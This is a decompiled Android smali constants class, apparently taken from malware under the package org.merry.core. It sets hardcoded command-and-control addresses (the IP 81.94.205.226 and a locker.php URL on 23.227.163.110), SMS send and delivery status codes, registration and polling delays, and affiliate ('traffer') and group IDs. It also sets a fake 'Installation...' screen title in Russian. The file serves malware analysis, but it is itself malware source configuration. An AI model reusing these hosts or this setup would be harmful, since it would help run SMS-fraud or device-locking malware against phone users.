.class public Lorg/merry/core/Consts;
.super Ljava/lang/Object;
.source "Consts.java"


# static fields
.field public static final BROWSER:I = 0x2

.field public static final MODE_MULTI:I = 0x2

.field public static final MODE_STANDALONE:I = 0x1

.field public static final REGMODE_DELAY:I = 0x2

.field public static final REGMODE_ONCE_INSTALLED:I = 0x1

.field public static final SCRIPT:I = 0x3

.field public static final SMS_STATUS_DELIVERED:I = 0x2

.field public static final SMS_STATUS_ERROR:I = 0x3

.field public static final SMS_STATUS_SENT:I = 0x1

.field public static final STANDARD_BROWSER:I = 0x1

.field public static activityName:Ljava/lang/String;

.field public static groupName:I

.field public static locker:Ljava/lang/Boolean;

.field public static lockerAddress:Ljava/lang/String;

.field public static queryDelay:I

.field public static registrationDelay:I

.field public static serverAddress:Ljava/lang/String;

.field public static trafferName:I

.field public static userAgent:Ljava/lang/String;

.field public static version:Ljava/lang/String;


# direct methods
.method static constructor <clinit>()V
    .locals 4

    .prologue
    const/16 v3, 0x1e

    const/4 v2, 0x0

    const/4 v1, 0x0

    .line 6
    sput-object v2, Lorg/merry/core/Consts;->activityName:Ljava/lang/String;

    .line 7
    sput v1, Lorg/merry/core/Consts;->trafferName:I

    .line 8
    sput v1, Lorg/merry/core/Consts;->groupName:I

    .line 9
    sput-object v2, Lorg/merry/core/Consts;->version:Ljava/lang/String;

    .line 10
    sput-object v2, Lorg/merry/core/Consts;->userAgent:Ljava/lang/String;

    .line 11
    sput-object v2, Lorg/merry/core/Consts;->serverAddress:Ljava/lang/String;

    .line 12
    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    sput-object v0, Lorg/merry/core/Consts;->locker:Ljava/lang/Boolean;

    .line 13
    sput-object v2, Lorg/merry/core/Consts;->lockerAddress:Ljava/lang/String;

    .line 25
    sput v1, Lorg/merry/core/Consts;->registrationDelay:I

    .line 26
    sput v1, Lorg/merry/core/Consts;->queryDelay:I

    .line 35
    const-string v0, "\u0423\u0441\u0442\u0430\u043d\u043e\u0432\u043a\u0430..."

    sput-object v0, Lorg/merry/core/Consts;->activityName:Ljava/lang/String;

    .line 36
    const/4 v0, 0x1

    sput v0, Lorg/merry/core/Consts;->trafferName:I

    .line 37
    const/4 v0, 0x5

    sput v0, Lorg/merry/core/Consts;->groupName:I

    .line 38
    const-string v0, "1.2"

    sput-object v0, Lorg/merry/core/Consts;->version:Ljava/lang/String;

    .line 39
    const-string v0, "xxx"

    sput-object v0, Lorg/merry/core/Consts;->userAgent:Ljava/lang/String;

    .line 40
    sput v3, Lorg/merry/core/Consts;->registrationDelay:I

    .line 41
    sput v3, Lorg/merry/core/Consts;->queryDelay:I

    .line 42
    const-string v0, "81.94.205.226"

    sput-object v0, Lorg/merry/core/Consts;->serverAddress:Ljava/lang/String;

    .line 43
    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    sput-object v0, Lorg/merry/core/Consts;->locker:Ljava/lang/Boolean;

    .line 44
    const-string v0, "http://23.227.163.110/locker.php"

    sput-object v0, Lorg/merry/core/Consts;->lockerAddress:Ljava/lang/String;

    .line 45
    return-void
.end method

.method public constructor <init>()V
    .locals 0

    .prologue
    .line 3
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method
